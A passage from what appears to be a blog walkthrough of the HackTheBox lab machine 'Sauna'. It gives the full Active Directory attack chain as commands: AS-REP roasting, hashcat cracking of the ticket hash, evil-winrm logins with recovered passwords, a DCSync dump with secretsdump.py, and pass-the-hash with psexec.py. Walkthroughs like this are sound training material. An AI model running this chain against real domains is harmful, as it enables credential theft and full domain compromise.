</span></span><span class=line><span class=cl>Fergus.Smith
</span></span><span class=line><span class=cl>FSmith
</span></span><span class=line><span class=cl>F.Smith
</span></span><span class=line><span class=cl>FaSmith
</span></span><span class=line><span class=cl>FeSmith
</span></span><span class=line><span class=cl>Shaun.Coins
</span></span><span class=line><span class=cl>SCoins
</span></span><span class=line><span class=cl>S.Coins
</span></span><span class=line><span class=cl>SaCoins
</span></span><span class=line><span class=cl>SeCoins
</span></span><span class=line><span class=cl>Hugo.Bear
</span></span><span class=line><span class=cl>HBear
</span></span><span class=line><span class=cl>H.Bear
</span></span><span class=line><span class=cl>HaBear
</span></span><span class=line><span class=cl>HeBear
</span></span><span class=line><span class=cl>Steven.Kerb
</span></span><span class=line><span class=cl>SKerb
</span></span><span class=line><span class=cl>S.Kerb
</span></span><span class=line><span class=cl>SaKerb
</span></span><span class=line><span class=cl>SeKerb
</span></span><span class=line><span class=cl>Bowie.Taylor
</span></span><span class=line><span class=cl>BTaylor
</span></span><span class=line><span class=cl>B.Taylor
</span></span><span class=line><span class=cl>BaTaylor
</span></span><span class=line><span class=cl>BeTaylor
</span></span><span class=line><span class=cl>Sophie.Driver
</span></span><span class=line><span class=cl>SDriver
</span></span><span class=line><span class=cl>S.Driver
</span></span><span class=line><span class=cl>SaDriver
</span></span><span class=line><span class=cl>SeDriver
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-fsmith>Shell as Fsmith<a class=anchor aria-hidden=true href=#shell-as-fsmith>#</a></h3><h4 id=as-rep-roasting>AS-REP Roasting<a class=anchor aria-hidden=true href=#as-rep-roasting>#</a></h4><blockquote><p>On <a href=https://fahmifj.github.io/writeup/htb-forest/>Forest Write-up</a>, I briefly explained about AS-REP Roasting.</p></blockquote><p>With the generated usernames, AS-REP roasting attack can be performed using <code>GetNPUsers.py</code> from Impacket.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ GetNPUsers.py -dc-ip <span class=s1>&#39;10.10.10.175&#39;</span> -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt
</span></span></code></pre></div><p>It successfully obtained <code>FSmith</code>&rsquo;s TGT.</p><p><div class=img-container><img src=imgs/image-20210407143301639.png alt=image-20210407143301639></div></p><h4 id=cracking-tgt>Cracking TGT<a class=anchor aria-hidden=true href=#cracking-tgt>#</a></h4><p><code>hashcat</code> successfully cracked the TGT (performed on my Windows machine).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\t</span>ools<span class=se>\h</span>ashcat6&gt;hashcat.exe -m <span class=m>18200</span> <span class=s1>&#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc&#39;</span> C:/tools/rockyou.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>... &lt;snip&gt; ...
</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$FSmith</span>@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10<span class=nv>$737</span>ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Session..........: hashcat
</span></span><span class=line><span class=cl>Status...........: Cracked
</span></span><span class=line><span class=cl>Hash.Name........: Kerberos 5, etype 23, AS-REP
</span></span><span class=line><span class=cl>Hash.Target......: <span class=nv>$krb5asrep$23$FSmith</span>@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc
</span></span><span class=line><span class=cl>... &lt;snip&gt; ...
</span></span></code></pre></div><p>The password is <code>Thestrokes23</code>.</p><h4 id=remote-access>Remote Access<a class=anchor aria-hidden=true href=#remote-access>#</a></h4><p>This user can login remotely with <code>evil-winrm</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ evil-winrm -i <span class=s1>&#39;10.10.10.175&#39;</span> -u fsmith -p <span class=s1>&#39;Thestrokes23&#39;</span> 
</span></span></code></pre></div><p>User flag is done here.</p><center><p><div class=img-container><img src=imgs/image-20210407143917902.png alt=image-20210407143917902></div></p></center><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-svc_loanmgr>Shell as svc_loanmgr<a class=anchor aria-hidden=true href=#shell-as-svc_loanmgr>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>WinPEAS discovered that <code>svc_loanmanager</code> has an autologon credential.</p><center><p><div class=img-container><img src=imgs/image-20210407132849744.png alt=image-20210407132849744></div></p></center><p>But based on <code>rpcclient</code>, it&rsquo;s actually <code>svc_loanmgr</code>.</p><center><p><div class=img-container><img src=imgs/image-20210408043941867.png alt=image-20210408043941867></div></p></center><p>This account also can login remotely.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ evil-winrm -i <span class=s1>&#39;10.10.10.175&#39;</span> -u svc_loanmgr -p <span class=s1>&#39;Moneymakestheworldgoround!&#39;</span>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc_loanmgr<span class=se>\D</span>ocuments&gt;
</span></span></code></pre></div><h3 id=shell-as-system>Shell as SYSTEM<a class=anchor aria-hidden=true href=#shell-as-system>#</a></h3><h4 id=enumeration-with-bloodhound>Enumeration with BloodHound<a class=anchor aria-hidden=true href=#enumeration-with-bloodhound>#</a></h4><p>I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.</p><p>I copied <code>SharpHound.exe</code> (the ingestor) to Sauna using <code>evilwin-rm</code> and ran it to start collecting data.</p><blockquote><p><code>evilwin-rm</code> has capability to transfer files directly between my machine and the remote (Sauna). The keywords are <code>download</code> and <code>upload</code>.</p></blockquote><center><p><div class=img-container><img src=imgs/image-20210407133118769.png alt=image-20210407133118769></div></p></center><p>It finished within a few seconds.</p><p>I copied the collected data to my machine and loaded it to <code>BloodHound</code> with drag and drop.</p><center><p><div class=img-container><img src=imgs/image-20210407133124208.png alt=image-20210407133124208></div></p></center><p>After trying a few of <code>BloodHound</code>&rsquo;s prebuilt queries, <code>BloodHound</code> reveals that <code>svc_loanmgr</code> has <code>GetChangesAll</code> and <code>GetChanges</code> permissions on the domain.</p><p><div class=img-container><img src=imgs/image-20210407133140640.png alt=image-20210407133140640></div></p><p>I can access the help section by right clicking the edge. So, <code>GetChanges</code> and <code>GetChangesAll</code> are in conjunction with <code>DS-Replication-Get-Changes-All</code>. This grants <code>svc_loanmgr</code> ability to perform the DCSync attack.</p><p><div class=img-container><img src=imgs/image-20210407133147048.png alt=image-20210407133147048></div></p><p>The &ldquo;Abuse Info&rdquo; section contains how to abuse these privileges using <code>mimikatz</code></p><p><div class=img-container><img src=imgs/image-20210407133150811.png alt=image-20210407133150811></div></p><h4 id=credential-dumping>Credential Dumping<a class=anchor aria-hidden=true href=#credential-dumping>#</a></h4><p>Since Windows Defender typically doesn&rsquo;t get along with <code>mimikatz</code>, I use <code>secretsdump.py</code> to perform a DCSync attack just like I did on Forest.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span class=s1>&#39;Moneymakestheworldgoround!&#39;</span>@10.10.10.175 -just-dc-ntlm
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210407133219251.png alt=image-20210407133219251></div></p><h4 id=pass-the-hash---psexecpy>Pass the hash - psexec.py<a class=anchor aria-hidden=true href=#pass-the-hash---psexecpy>#</a></h4><p>Now I can use <code>psexec.py</code> to perform pass-the-hash using administrator hash to gain shell access as local system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210407133250451.png alt=image-20210407133250451></div></p></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-plus/>OSCP-plus</a></li><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://fahmifj.github.io/tags/asrep-roasting/>ASREP-roasting</a></li><li><a href=https://fahmifj.github.io/tags/bloodhound/>BloodHound</a></li><li><a href=https://fahmifj.github.io/tags/dcsync/>DCSync</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Sauna&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f&hashtags=OSCP-plus%2cWindows%2cActive-Directory%2cASREP-roasting%2cBloodHound%2cDCSync"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f&title=HackTheBox%20-%20Sauna&summary=HackTheBox%20-%20Sauna&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f&title=HackTheBox%20-%20Sauna"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Sauna%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Sauna on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Sauna&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsauna%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>